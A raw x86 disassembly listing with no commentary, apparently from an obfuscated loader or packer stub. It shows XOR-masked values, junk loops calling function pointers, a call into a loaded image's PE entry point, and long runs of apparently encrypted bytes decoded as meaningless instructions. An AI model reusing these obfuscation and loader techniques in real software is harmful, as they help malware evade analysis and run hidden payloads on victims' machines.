  4096bc:	push   eax
  4096bd:	mov    eax,ds:0x4121a8
  4096c2:	push   DWORD PTR [eax+0x1bc]
  4096c8:	call   0x4020d0
  4096cd:	mov    eax,DWORD PTR [ebp-0x4]
  4096d0:	xor    eax,esi
  4096d2:	lea    ebx,[ebx+eax*1+0x32729b]
  4096d9:	mov    eax,DWORD PTR [ebp-0x4]
  4096dc:	mov    ecx,DWORD PTR [ebp-0x4]
  4096df:	xor    ecx,esi
  4096e1:	xor    eax,esi
  4096e3:	add    eax,ecx
  4096e5:	mov    ecx,DWORD PTR [ebp-0x4]
  4096e8:	xor    ecx,esi
  4096ea:	lea    eax,[eax+ecx*1+0x9757d1]
  4096f1:	cmp    ebx,eax
  4096f3:	jbe    0x4096a3
  4096f9:	mov    eax,0xf89c853d
  4096fe:	mov    ecx,DWORD PTR [ebp+0xc]
  409701:	mov    DWORD PTR ds:0x41202c,ecx
  409707:	mov    ecx,DWORD PTR [ebp+0x10]
  40970a:	mov    DWORD PTR ds:0x412280,ecx
  409710:	mov    ecx,DWORD PTR ds:0x41202c
  409716:	mov    edx,DWORD PTR [ebp-0x14]
  409719:	sub    ecx,edi
  40971b:	xor    ecx,esi
  40971d:	mov    DWORD PTR [edx],ecx
  40971f:	mov    ecx,DWORD PTR [ebp-0x18]
  409722:	cmp    ecx,0xf89c8532
  409728:	je     0x409785
  40972e:	mov    ecx,DWORD PTR [ebp-0x8]
  409731:	mov    edx,DWORD PTR [ebp-0x1c]
  409734:	xor    ecx,esi
  409736:	add    ecx,edi
  409738:	cmp    ecx,edx
  40973a:	je     0x409785
  409740:	mov    eax,ds:0x4121a8
  409745:	mov    eax,DWORD PTR [eax+0x194]
  40974b:	mov    ecx,DWORD PTR [eax]
  40974d:	mov    eax,DWORD PTR [ecx+0x3c]
  409750:	push   DWORD PTR ds:0x412280
  409756:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40975a:	push   DWORD PTR ds:0x41202c
  409760:	add    eax,ecx
  409762:	mov    ecx,DWORD PTR ds:0x4121a8
  409768:	mov    ecx,DWORD PTR [ecx+0x194]
  40976e:	push   DWORD PTR [ecx]
  409770:	call   eax
  409772:	mov    ecx,DWORD PTR ds:0x4121a8
  409778:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40977e:	mov    DWORD PTR [ecx],eax
  409780:	jmp    0x409895
  409785:	mov    ecx,DWORD PTR [ebp-0x8]
  409788:	mov    edx,DWORD PTR [ebp-0x20]
  40978b:	xor    ecx,esi
  40978d:	add    ecx,edi
  40978f:	cmp    ecx,edx
  409791:	jne    0x409878
  409797:	mov    ecx,DWORD PTR [ebp-0x8]
  40979a:	xor    ecx,esi
  40979c:	add    ecx,edi
  40979e:	mov    DWORD PTR ds:0x41222c,ecx
  4097a4:	mov    ecx,DWORD PTR [ebp-0x8]
  4097a7:	xor    ecx,esi
  4097a9:	add    ecx,edi
  4097ab:	mov    DWORD PTR ds:0x412224,ecx
  4097b1:	mov    ecx,DWORD PTR [ebp-0x4]
  4097b4:	mov    DWORD PTR [ebp-0xc],ecx
  4097b7:	mov    ecx,DWORD PTR [ebp-0x8]
  4097ba:	mov    DWORD PTR [ebp+0xc],ecx
  4097bd:	mov    ecx,DWORD PTR [ebp+0xc]
  4097c0:	xor    ecx,esi
  4097c2:	add    ecx,edi
  4097c4:	mov    DWORD PTR [ebp+0xc],ecx
  4097c7:	mov    ecx,DWORD PTR ds:0x412028
  4097cd:	mov    ecx,DWORD PTR [ecx]
  4097cf:	mov    DWORD PTR [ebp+0xc],ecx
  4097d2:	mov    ecx,DWORD PTR ds:0x412230
  4097d8:	mov    ecx,DWORD PTR [ecx]
  4097da:	mov    DWORD PTR [ebp-0x14],ecx
  4097dd:	mov    DWORD PTR [ebp+0x10],0xf89c8731
  4097e4:	mov    ecx,DWORD PTR [ebp+0x10]
  4097e7:	xor    ecx,esi
  4097e9:	add    ecx,edi
  4097eb:	mov    DWORD PTR [ebp+0x10],ecx
  4097ee:	mov    ecx,DWORD PTR ds:0x4121a8
  4097f4:	mov    DWORD PTR [ebp+0x10],ecx
  4097f7:	mov    ecx,DWORD PTR [ebp+0xc]
  4097fa:	mov    DWORD PTR [ebp+0xc],ecx
  4097fd:	mov    ecx,DWORD PTR [ebp+0xc]
  409800:	push   0x4
  409802:	pop    edx
  409803:	sub    edx,ecx
  409805:	add    edx,DWORD PTR [ebp-0x14]
  409808:	mov    DWORD PTR [ebp-0x24],0xf89c85f1
  40980f:	mov    DWORD PTR [ebp+0x10],edx
  409812:	mov    DWORD PTR [ebp-0x70],eax
  409815:	mov    eax,DWORD PTR [ebp+0xc]
  409818:	mov    DWORD PTR [ebp-0x6c],eax
  40981b:	mov    eax,DWORD PTR [ebp+0x10]
  40981e:	mov    DWORD PTR [ebp-0x68],eax
  409821:	mov    eax,DWORD PTR [ebp-0x24]
  409824:	xor    eax,esi
  409826:	add    eax,edi
  409828:	mov    DWORD PTR [ebp-0x64],eax
  40982b:	lea    eax,[ebp-0x2c]
  40982e:	mov    DWORD PTR [ebp-0x60],eax
  409831:	mov    eax,DWORD PTR [ebp-0x70]
  409834:	xor    eax,esi
  409836:	add    eax,edi
  409838:	mov    DWORD PTR [ebp-0x70],eax
  40983b:	lea    eax,[ebp-0x70]
  40983e:	push   eax
  40983f:	mov    eax,DWORD PTR [ebp-0xc]
  409842:	xor    eax,esi
  409844:	add    eax,edi
  409846:	push   eax
  409847:	mov    eax,ds:0x4121c8
  40984c:	push   0x41211e
  409851:	push   DWORD PTR [eax]
  409853:	call   0x40cdc5
  409858:	xor    esi,esi
  40985a:	mov    eax,DWORD PTR [ebp+0x10]
  40985d:	sub    eax,esi
  40985f:	push   eax
  409860:	mov    eax,DWORD PTR [ebp+0xc]
  409863:	add    eax,esi
  409865:	push   eax
  409866:	call   0x406a53
  40986b:	inc    esi
  40986c:	cmp    esi,0x52
  40986f:	jb     0x40985a
  409875:	mov    eax,DWORD PTR [ebp-0xc]
  409878:	call   0x4054ab
  40987d:	lea    eax,[ebp+0x4]
  409880:	mov    DWORD PTR [ebp-0x28],eax
  409883:	mov    eax,DWORD PTR [ebp-0x10]
  409886:	mov    eax,DWORD PTR [ebp-0x4]
  409889:	push   DWORD PTR [ebp-0x8]
  40988c:	lea    eax,[ebp-0x28]
  40988f:	push   eax
  409890:	call   0x40ccd9
  409895:	mov    eax,ds:0x4121a8
  40989a:	push   0x4
  40989c:	add    eax,0x1cc
  4098a1:	push   eax
  4098a2:	lea    eax,[ebp-0x10]
  4098a5:	push   eax
  4098a6:	call   0x4020d0
  4098ab:	mov    eax,DWORD PTR [ebp-0x10]
  4098ae:	mov    eax,DWORD PTR [eax]
  4098b0:	pop    edi
  4098b1:	pop    esi
  4098b2:	pop    ebx
  4098b3:	leave  
  4098b4:	ret    0xc
  4098b7:	push   ebp
  4098b8:	mov    ebp,esp
  4098ba:	sub    esp,0x24
  4098bd:	mov    eax,ds:0x4121a8
  4098c2:	xor    ecx,DWORD PTR ds:0x42e644
  4098c8:	mov    eax,DWORD PTR [eax+0x198]
  4098ce:	mov    DWORD PTR [ebp-0x8],eax
  4098d1:	mov    DWORD PTR ds:0x4302dd,0x14
  4098db:	cmp    DWORD PTR ds:0x4302dd,0x0
  4098e2:	je     0x40993f
  4098e8:	cmp    DWORD PTR ds:0x4302dd,0x1b
  4098ef:	jne    0x40991f
  4098f5:	push   0x8cdb
  4098fa:	push   DWORD PTR [ebp-0x10]
  4098fd:	push   0x3afe
  409902:	push   0x5d4e
  409907:	push   DWORD PTR [ebp-0x10]
  40990a:	push   0x4817
  40990f:	push   0x7044
  409914:	push   0x34c1
  409919:	call   DWORD PTR ds:0x42eab3
  40991f:	mov    eax,ds:0x4302dd
  409924:	dec    eax
  409925:	mov    ds:0x4302dd,eax
  40992a:	jmp    0x4098db
  40992f:	mov    eax,ds:0x430357
  409934:	or     eax,DWORD PTR ds:0x43035f
  40993a:	mov    ds:0x430357,eax
  40993f:	mov    eax,DWORD PTR [ebp+0x8]
  409942:	mov    DWORD PTR ds:0x42e650,0x13
  40994c:	cmp    DWORD PTR ds:0x42e650,0x0
  409953:	je     0x40998b
  409959:	cmp    DWORD PTR ds:0x42e650,0x19
  409960:	jne    0x409979
  409966:	push   0x7ebc
  40996b:	push   0x1c7b
  409970:	push   DWORD PTR [ebp-0x10]
  409973:	call   DWORD PTR ds:0x42eab7
  409979:	mov    ecx,DWORD PTR ds:0x42e650
  40997f:	dec    ecx
  409980:	mov    DWORD PTR ds:0x42e650,ecx
  409986:	jmp    0x40994c
  40998b:	mov    ecx,DWORD PTR [ebp-0x8]
  40998e:	xor    DWORD PTR ds:0x4302c9,0x600e
  409998:	push   ebx
  409999:	push   esi
  40999a:	mov    esi,0x7510854
  40999f:	xor    eax,esi
  4099a1:	xor    DWORD PTR ds:0x4302d9,ebx
  4099a7:	push   edi
  4099a8:	and    DWORD PTR ds:0x43034f,0x0
  4099b2:	mov    edi,DWORD PTR ds:0x43034f
  4099b8:	inc    edi
  4099b9:	mov    DWORD PTR ds:0x43034f,edi
  4099bf:	cmp    DWORD PTR ds:0x43034f,0x8
  4099c6:	jne    0x4099e8
  4099cc:	push   0x4302bd
  4099d1:	push   DWORD PTR [ebp-0x24]
  4099d4:	push   DWORD PTR [ebp-0x1c]
  4099d7:	push   DWORD PTR [ebp-0x28]
  4099da:	push   DWORD PTR [ebp-0x28]
  4099dd:	push   0x8706
  4099e2:	call   DWORD PTR ds:0x42e947
  4099e8:	cmp    DWORD PTR ds:0x43034f,0x7
  4099ef:	jne    0x409a02
  4099f5:	mov    edi,DWORD PTR ds:0x43034f
  4099fb:	inc    edi
  4099fc:	mov    DWORD PTR ds:0x43034f,edi
  409a02:	cmp    DWORD PTR ds:0x43034f,0x16
  409a09:	jb     0x4099b2
  409a0f:	add    DWORD PTR ds:0x43035f,0x13b8
  409a19:	mov    edi,0x32729b
  409a1e:	and    DWORD PTR ds:0x4302b5,0x0
  409a28:	mov    ebx,DWORD PTR ds:0x4302b5
  409a2e:	inc    ebx
  409a2f:	mov    DWORD PTR ds:0x4302b5,ebx
  409a35:	cmp    DWORD PTR ds:0x4302b5,0xe
  409a3c:	jne    0x409a50
  409a42:	push   DWORD PTR [ebp-0x18]
  409a45:	push   0x6c31
  409a4a:	call   DWORD PTR ds:0x42e883
  409a50:	cmp    DWORD PTR ds:0x4302b5,0xd
  409a57:	jne    0x409a6a
  409a5d:	mov    ebx,DWORD PTR ds:0x4302b5
  409a63:	inc    ebx
  409a64:	mov    DWORD PTR ds:0x4302b5,ebx
  409a6a:	cmp    DWORD PTR ds:0x4302b5,0x18
  409a71:	jb     0x409a28
  409a77:	mov    ebx,DWORD PTR ds:0x42e648
  409a7d:	or     DWORD PTR ds:0x42ec4b,ebx
  409a83:	jmp    0x409dd0
  409a88:	pop    eax
  409a89:	push   edi
  409a8a:	lods   al,BYTE PTR ds:[esi]
  409a8b:	sahf   
  409a8c:	mov    cl,0x65
  409a8e:	push   0x8aa37451
  409a93:	push   ebx
  409a94:	pop    ebx
  409a95:	mov    eax,ds:0xdc59fd12
  409a9a:	jle    0x409b1a
  409a9c:	cs jge 0x409b1d
  409a9f:	jle    0x409ad8
  409aa1:	inc    ebx
  409aa2:	mov    eax,ds:0x91ee6f5a
  409aa7:	jbe    0x409a93
  409aa9:	pop    ss
  409aaa:	loop   0x409ad5
  409aac:	xor    eax,0x1df87087
  409ab1:	fstp   DWORD PTR [eax+ebx*1+0x79d6e3ec]
  409ab8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ab9:	xchg   DWORD PTR [edx-0x30],ebx
  409abc:	cmp    BYTE PTR [edi],bh
  409abe:	fist   WORD PTR [edi-0x42]
  409ac1:	push   ss
  409ac2:	dec    ebp
  409ac3:	das    
  409ac4:	std    
  409ac5:	repz jns 0xcab2f1
  409acc:	aam    0x41
  409ace:	mov    esi,fs
  409ad0:	mov    ds:0x6254601,al
  409ad5:	pusha  
  409ad6:	out    0xe4,eax
  409ad8:	retf   0x2d7b
  409adb:	sub    ebp,DWORD PTR [eax+eiz*4]
  409ade:	dec    ecx
  409adf:	push   ss
  409ae0:	out    dx,al
  409ae1:	jne    0x409b36
  409ae3:	(bad)  
  409ae5:	ss aas 
  409ae7:	pop    ecx
  409ae8:	test   ecx,esi
  409aea:	test   al,0x6d
  409aec:	enter  0x54eb,0xd0
  409af0:	push   DWORD PTR ds:0x1a008e53
  409af6:	(bad)  
  409af7:	jmp    0xfacb4a80
  409afc:	ret    
  409afd:	ret    
  409afe:	outs   dx,BYTE PTR ds:[esi]
  409aff:	or     esp,0xe5af123f
  409b05:	cdq    
  409b06:	xchg   edx,eax
  409b07:	bound  ebx,QWORD PTR [eax+ebx*4-0x539854c0]
  409b0e:	aam    0x76
  409b10:	mov    dh,0x20
  409b12:	in     ax,dx
  409b14:	cmp    ecx,DWORD PTR [esp+eax*8+0x65]
  409b18:	mov    ah,BYTE PTR [edi+0x5]
  409b1b:	mov    al,ds:0x6747f906
  409b20:	fst    DWORD PTR [eax+0x9]
  409b23:	pause  
  409b25:	jp     0x409ae0
  409b27:	inc    ebp
  409b28:	retf   0xb9bc
  409b2b:	mov    eax,0x70be1644
  409b30:	js     0x409b16
  409b32:	push   ss
  409b33:	pop    esi
  409b34:	scas   al,BYTE PTR es:[edi]
  409b35:	(bad)  
  409b36:	loope  0x409ac2
  409b38:	retf   
  409b39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b3a:	fidiv  DWORD PTR [esi]
  409b3c:	jle    0x409b53
  409b3e:	out    dx,al
  409b3f:	jne    0x409adb
  409b41:	shr    BYTE PTR [edi-0x6bbed8e5],cl
  409b47:	pop    ebp
  409b48:	out    dx,eax
  409b49:	fwait
  409b4a:	or     dl,dl
  409b4c:	adc    al,0x75
  409b4e:	inc    eax
  409b4f:	xchg   ebx,eax
  409b50:	dec    eax
  409b51:	pop    ss
  409b52:	push   cs
  409b53:	lods   eax,DWORD PTR ds:[esi]
  409b54:	pop    ebp
  409b55:	jne    0x409bb6
  409b57:	aam    0xea
  409b59:	mov    WORD PTR [ebp+0x4ab1a86c],?
  409b5f:	mov    ah,0xe9
  409b61:	xor    al,0xd2
  409b63:	std    
  409b64:	xchg   ebx,eax
  409b65:	aad    0x62
  409b67:	sub    dl,al
  409b69:	xor    al,0x15
  409b6b:	rcl    ah,1
  409b6d:	(bad)  
  409b6e:	fsubr  DWORD PTR [edi+0x5730d4f2]
  409b74:	test   ebx,ecx
  409b76:	xor    bl,al
  409b78:	dec    ecx
  409b79:	test   eax,0x68390439
  409b7e:	inc    ebp
  409b7f:	mov    ch,0x9f
  409b81:	les    esp,FWORD PTR [ecx+eiz*8-0xd127917]
  409b88:	xlat   BYTE PTR ds:[ebx]
  409b89:	out    0x4a,eax
  409b8b:	mov    dl,0xc8
  409b8d:	jmp    0x708aade7
  409b92:	or     esp,ecx
  409b94:	lock iret 
  409b96:	dec    edi
  409b97:	pop    ds
  409b98:	jg     0x409bca
  409b9a:	pop    ss
  409b9b:	imul   ebx,DWORD PTR [ebp-0x510d3b51],0xffffffdd
  409ba2:	ret    
  409ba3:	pop    edx
  409ba4:	push   cs
  409ba5:	push   0xffffffca
  409ba7:	sbb    eax,0xd8ce4bcb
  409bac:	stc    
  409bad:	or     al,BYTE PTR [edx]
  409baf:	repnz cs scas eax,DWORD PTR es:[edi]
  409bb2:	retf   0x22c5
  409bb5:	outs   dx,DWORD PTR ds:[esi]
  409bb6:	sbb    eax,0x46a270b0
  409bbb:	ss in  al,dx
  409bbd:	je     0x409bb9
  409bbf:	les    edx,FWORD PTR [ebx+0x139d958]
  409bc5:	jmp    0xef5e:0xef18a6b1
  409bcc:	in     al,dx
  409bcd:	in     eax,0x53
  409bcf:	in     al,0x18
  409bd1:	fcomip st,st(6)
  409bd3:	aad    0x4a
  409bd5:	sbb    BYTE PTR [ebx-0x17],dh
  409bd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409bd9:	test   BYTE PTR [esi-0x7e4f5d36],bl
  409bdf:	arpl   WORD PTR [esi-0x2ab4cc37],bx
  409be5:	adc    al,BYTE PTR [edx-0x11]
  409be8:	loopne 0x409b96
  409bea:	mov    ah,0x51
  409bec:	cs loopne 0x409bc6
  409bef:	sti    
  409bf0:	adc    DWORD PTR [ebx],ebp
  409bf2:	cwde   
  409bf3:	shr    BYTE PTR [esi+0x7d3ba273],cl
  409bf9:	popf   
  409bfa:	mov    ebx,0x817662db
  409bff:	loope  0x409bac
  409c01:	dec    edi
  409c02:	enter  0xf05d,0x6a
  409c06:	jmp    0xe694:0x96e6f99
  409c0d:	pushf  
  409c0e:	sbb    bl,BYTE PTR ds:0xf8732a7a
  409c14:	sbb    eax,0x4f1907ba
  409c19:	call   0x6b80:0x1a000d95
  409c20:	mov    ecx,0xbf2ff078
  409c25:	popa   
  409c26:	mov    ebx,0x2a301693
  409c2b:	sbb    edx,eax
  409c2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c2e:	ror    esp,0xff
  409c31:	(bad)  
  409c33:	imul   eax,DWORD PTR [ecx+0x4282b830],0x5a
  409c3a:	xor    eax,0x2c
  409c3d:	sbb    al,0xa
  409c3f:	xor    DWORD PTR [eax+ebp*8+0x53eecd9e],esp
  409c46:	mov    BYTE PTR [edx],ah
  409c48:	jl     0x409c95
  409c4a:	mov    bl,BYTE PTR [edx]
  409c4c:	add    al,0x14
  409c4e:	ins    DWORD PTR es:[edi],dx
  409c4f:	push   eax
  409c50:	sahf   
  409c51:	ror    BYTE PTR [eax],1
  409c53:	sub    al,0x4a
  409c55:	jb     0x409c27
  409c57:	imul   esp,DWORD PTR [ecx+ebx*8-0x4207e39],0x91729cf
  409c62:	push   ebp
  409c63:	outs   dx,BYTE PTR ds:[esi]
  409c64:	shr    BYTE PTR [ebp-0x23],cl
  409c67:	cmp    bl,BYTE PTR [eax-0x44caa88]
  409c6d:	xchg   DWORD PTR [edi],ebx
  409c6f:	adc    eax,0xc9fa3154
  409c74:	add    al,BYTE PTR [edi+0x17eece38]
  409c7a:	ret    
  409c7b:	dec    ecx
  409c7c:	mov    ch,0xcb
  409c7e:	stos   BYTE PTR es:[edi],al
  409c7f:	xor    eax,0x41cb6377
  409c84:	sub    BYTE PTR [eax-0x29262cc],bl
  409c8a:	xchg   edx,eax
  409c8b:	dec    ebx
  409c8c:	dec    ecx
  409c8d:	pop    ds
  409c8e:	(bad)  
  409c8f:	sbb    ebp,DWORD PTR [esi]
  409c91:	into   
  409c92:	in     eax,dx
  409c93:	xor    al,BYTE PTR [edx+0x33033db5]
  409c99:	and    ebp,DWORD PTR [ebx+0x70]
  409c9c:	pop    esp
  409c9d:	fldenv [esi+0x1e]
  409ca0:	cmp    DWORD PTR [esi-0x29df2760],ecx
  409ca6:	ret    
  409ca7:	ficom  WORD PTR [edx]
  409ca9:	retf   0x77c9
  409cac:	test   cl,ch
  409cae:	mov    dh,0x14
  409cb0:	adc    al,0x49
  409cb2:	dec    ebx
  409cb3:	into   
  409cb4:	imul   esp,DWORD PTR [esi],0x61309e60
  409cba:	aas    
  409cbb:	pop    ss
  409cbc:	retf   0x6a5d
  409cbf:	bound  ebx,QWORD PTR ss:[edi-0x5f]
  409cc3:	out    dx,al
  409cc4:	jb     0x409c77
  409cc6:	push   ecx
  409cc7:	js     0x409cef
  409cc9:	ja     0x409cf9
  409ccb:	call   0x75b1:0xcf7ab3a6
  409cd2:	cli    
  409cd3:	rol    bh,cl
  409cd5:	stos   BYTE PTR es:[edi],al
  409cd6:	mov    ecx,esp
  409cd8:	dec    ebp
  409cd9:	mov    ecx,DWORD PTR gs:[eax+0x117ac254]
  409ce0:	inc    esi
  409ce1:	hlt    
  409ce2:	cmp    DWORD PTR [ebp+0x25],0x22
  409ce6:	sub    BYTE PTR [ecx],0x70
  409ce9:	repz pop eax
  409ceb:	inc    esp
  409cec:	and    al,BYTE PTR [ebx-0x22]
  409cef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409cf0:	(bad)  
  409cf1:	fsubr  DWORD PTR [ebp+0xb]
  409cf4:	pop    ss
  409cf5:	cli    
  409cf6:	mov    DWORD PTR [edi-0x6f],eax
  409cf9:	ss mov dl,0x79
  409cfc:	sti    
  409cfd:	sbb    al,0x57
  409cff:	sahf   
  409d00:	nop
  409d01:	fiadd  DWORD PTR [ebp-0x2]
  409d04:	pop    ss
  409d05:	mov    dh,BYTE PTR [esi]
  409d07:	mov    al,ds:0x4e60957a
  409d0c:	ficom  DWORD PTR [edx]
  409d0e:	xlat   BYTE PTR ds:[ebx]
  409d0f:	lea    ecx,[edi+0x12]
  409d12:	fldcw  WORD PTR [esi+0x20]
  409d15:	jbe    0x409cfb
  409d17:	(bad)  
  409d18:	cmp    esp,DWORD PTR [eax-0x1a]
  409d1b:	pop    ecx
  409d1c:	pop    edx
  409d1d:	mov    esp,DWORD PTR [esi+0x666e5990]
  409d23:	call   0x1841:0x661acc5d
  409d2a:	fstp   TBYTE PTR [edi]
  409d2c:	and    al,0xd2
  409d2e:	fs pop eax
  409d30:	cmp    eax,0x150b9b24
  409d35:	cmp    DWORD PTR [edi+0x285ea3ce],ecx
  409d3b:	popa   
  409d3c:	cmp    BYTE PTR [edx+0x7e],bh
  409d3f:	pop    esi
  409d40:	jmp    0xa2bf0b75
  409d45:	jno    0x409d78
  409d47:	push   eax
  409d48:	dec    edx
  409d49:	pushf  
  409d4a:	dec    esp
  409d4b:	cmp    BYTE PTR [edx+0x67a852c],bh
  409d51:	xchg   esi,eax
  409d52:	fild   DWORD PTR [ebx+0x0]
  409d55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d56:	jmp    FWORD PTR [esi+0x7a]
  409d59:	adc    eax,0xb803ba9d
  409d5e:	add    al,BYTE PTR [edi+0x41af4fd]
  409d64:	movlhps xmm5,xmm4
  409d67:	test   DWORD PTR [ebx+0x26d50cb6],esp
  409d6d:	sub    dh,BYTE PTR [edx-0x4a66719c]
  409d73:	fwait
  409d74:	(bad)  
  409d76:	test   al,0x84
  409d78:	xchg   ebp,eax
  409d79:	cmp    esi,DWORD PTR [esi]
  409d7b:	and    dh,BYTE PTR [edi-0x224bdba7]
  409d81:	inc    eax
  409d82:	push   ss
  409d83:	jae    0x409da6
  409d85:	mov    ecx,0xc7e24e2e
  409d8a:	sub    BYTE PTR [edx],bh
  409d8c:	jp     0x409d41
  409d8e:	mov    bl,0x30
  409d90:	call   0x7f9af75f
  409d95:	scas   eax,DWORD PTR es:[edi]
  409d96:	loop   0x409d1f
  409d98:	sti    
  409d99:	xchg   ecx,eax
  409d9a:	push   0x2d
  409d9c:	lods   al,BYTE PTR ds:[esi]
  409d9d:	push   ebp
  409d9e:	jo     0x409de8
  409da0:	loopne 0x409dcd
  409da2:	into   
  409da3:	out    dx,eax
  409da4:	inc    ecx
  409da5:	dec    ecx
  409da6:	dec    BYTE PTR [edx-0x61]
  409da9:	or     eax,0xb7950f47
  409dae:	xor    BYTE PTR ss:[edx+0x4026cd77],0x35
  409db6:	add    bh,BYTE PTR [eax-0x733edaf2]
  409dbc:	fs jns 0x409e14
  409dbf:	push   ecx
  409dc0:	out    dx,eax
  409dc1:	push   esi
  409dc2:	dec    esp
  409dc3:	mov    ah,0xa3
  409dc5:	stc    
  409dc6:	push   esp
  409dc7:	pop    es
  409dc8:	(bad)  
  409dc9:	mov    ds:0x540a2e4,al
  409dce:	pop    esi
  409dcf:	iret   
  409dd0:	add    eax,edi
  409dd2:	mov    ebx,DWORD PTR ds:0x42e658
  409dd8:	add    ebx,DWORD PTR ds:0x430357
  409dde:	mov    DWORD PTR ds:0x42e658,ebx
  409de4:	mov    DWORD PTR [ecx],eax
  409de6:	add    DWORD PTR ds:0x4302dd,0xe83
  409df0:	lea    eax,[ebp-0x4]
  409df3:	sub    DWORD PTR ds:0x43034f,ecx
  409df9:	mov    DWORD PTR [ebp-0x10],eax
  409dfc:	movzx  ebx,WORD PTR ds:0x4302d1
  409e03:	and    DWORD PTR ds:0x4302f1,ebx
  409e09:	mov    eax,DWORD PTR [ebp+0x8]
  409e0c:	add    DWORD PTR ds:0x4302cd,0x3f18
  409e16:	mov    ecx,DWORD PTR [ebp-0x10]
  409e19:	jmp    0x40a166
  409e1e:	scas   al,BYTE PTR es:[edi]
  409e1f:	mov    ebx,0x35712771
  409e24:	push   0x30b4a53
  409e29:	jb     0x409e02
  409e2b:	push   es
  409e2c:	dec    esi
  409e2d:	aad    0x9
  409e2f:	fdivr  DWORD PTR [esi+0x7e]
  409e32:	cs jge 0x409eb3
  409e35:	jle    0x409e2e
  409e37:	jecxz  0x409dfe
  409e39:	pop    esi
  409e3a:	ret    0xe863
  409e3d:	test   al,0x7b
  409e3f:	dec    esp
  409e40:	outs   dx,BYTE PTR fs:[esi]
  409e42:	iret   
  409e43:	jmp    0x9116:0xd7725146
  409e4a:	push   es
  409e4b:	jae    0x409e93
  409e4d:	ror    ebx,1
  409e4f:	loopne 0x409eb3
  409e51:	pop    edx
  409e52:	pop    edx
  409e53:	or     eax,0xe9fba3b3
  409e58:	loope  0x409e3e
  409e5a:	shr    BYTE PTR [eax+0x44],1
  409e5d:	fs das 
  409e5f:	cdq    
  409e60:	ins    BYTE PTR es:[edi],dx
  409e61:	jns    0x409dea
  409e63:	mov    ds:0x66a21512,eax
  409e68:	adc    ch,dh
  409e6a:	test   eax,0xbb48fc46
  409e6f:	aad    0x87
  409e71:	or     eax,0x24e40642
  409e76:	ret    0x8b6c
  409e79:	fsubr  DWORD PTR [ebp-0x3fd3ba8c]
  409e7f:	jp     0x409edc
  409e81:	fiadd  WORD PTR [esi-0x21]
  409e84:	add    al,0xd8
  409e86:	sbb    BYTE PTR [edx+0x1b],0xe6
  409e8a:	(bad)  
  409e8b:	int    0x0
  409e8d:	int3   
  409e8e:	xchg   ecx,eax
  409e8f:	out    0x50,al
  409e91:	out    dx,eax
  409e92:	mov    eax,0x5fa1b9f8
  409e97:	fs cld 
  409e99:	sub    dh,dl
  409e9b:	out    dx,al
  409e9c:	mov    DWORD PTR [esi],ecx
  409e9e:	mov    DWORD PTR [esp+edi*1-0x5da3119a],ecx
  409ea5:	jl     0x409ea2
  409ea7:	adc    bh,BYTE PTR [edx+0x56]
  409eaa:	dec    edx
  409eab:	push   edx
  409eac:	sbb    eax,0x1b908daa
  409eb1:	retf   
  409eb2:	test   BYTE PTR [ecx],ch
  409eb4:	lds    ebx,FWORD PTR [ecx+esi*8-0x7be426ad]
  409ebb:	mul    esi
  409ebd:	call   0xc6cce37f
  409ec2:	dec    eax
  409ec3:	add    al,cl
  409ec5:	pop    ss
  409ec6:	pop    ds
  409ec7:	call   0x250d:0x6068a2e9
  409ece:	sbb    al,0xbe
  409ed0:	cdq    
  409ed1:	mov    bh,0x2e
  409ed3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ed4:	and    DWORD PTR es:[eax],0x58798b52
  409edb:	clc    
  409edc:	fistp  DWORD PTR [edi]
  409ede:	in     eax,0x9f
  409ee0:	cmp    edx,DWORD PTR [edx]
  409ee2:	dec    ecx
  409ee3:	test   eax,0xaae22792
  409ee8:	sbb    eax,0x2581ac6d
  409eed:	retf   
  409eee:	jp     0x409f33
  409ef0:	mov    esp,0x6e5065ef
  409ef5:	dec    edi
  409ef6:	xor    al,0xf3
  409ef8:	sti    
  409ef9:	out    0x58,eax
  409efb:	and    esp,eax
  409efd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409efe:	sub    al,0x1
  409f00:	jmp    0x31f5:0x1c5642b0
  409f07:	mov    ds:0x142739d8,al
  409f0c:	sahf   
  409f0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f0e:	jo     0x409ef9
  409f10:	out    dx,eax
  409f11:	pop    edx
  409f12:	das    
  409f13:	adc    eax,0xcfffd01e
  409f18:	xor    al,0x99
  409f1a:	add    BYTE PTR [eax],bh
  409f1c:	dec    ebx
  409f1d:	stos   BYTE PTR es:[edi],al
  409f1e:	adc    al,0xba
  409f20:	xchg   edx,eax
  409f21:	ins    DWORD PTR es:[edi],dx
  409f22:	lds    edi,FWORD PTR [edx+eiz*1]
  409f25:	aaa    
  409f26:	stc    
  409f27:	mov    dl,0x2a
  409f29:	dec    ecx
  409f2a:	and    al,0x46
  409f2c:	loope  0x409ece
  409f2e:	retf   0x629
  409f31:	jge    0x409f9e
  409f33:	dec    eax
  409f34:	das    
  409f35:	repnz lock ins DWORD PTR es:[edi],dx
  409f38:	cdq    
  409f39:	xor    al,0xb9
  409f3b:	in     eax,0xb5
  409f3d:	xor    ebp,DWORD PTR [ebp-0x50]
  409f40:	out    0x28,eax
  409f42:	and    DWORD PTR [edx],ebp
  409f44:	or     al,0x97
  409f46:	cmp    eax,0x38039556
  409f4b:	adc    ch,dh
  409f4d:	and    ah,BYTE PTR [esi-0x51]
  409f50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f51:	ins    DWORD PTR es:[edi],dx
  409f52:	push   0xffffffc4
  409f54:	lods   eax,DWORD PTR ds:[esi]
  409f55:	mov    ch,0x86
  409f57:	ret    
  409f58:	in     al,dx
  409f59:	shl    BYTE PTR [ecx-0x7d],1
  409f5c:	cmc    
  409f5d:	sbb    BYTE PTR [esp],ah
  409f60:	push   ecx
  409f61:	sar    BYTE PTR [ebp-0x2],1
  409f64:	xchg   esp,eax
  409f65:	les    esi,FWORD PTR [edx]
  409f67:	fistp  WORD PTR [esi+eax*1]
  409f6a:	stos   DWORD PTR es:[edi],eax
  409f6b:	adc    BYTE PTR [edi-0x3eb62b08],dl
  409f71:	cld    
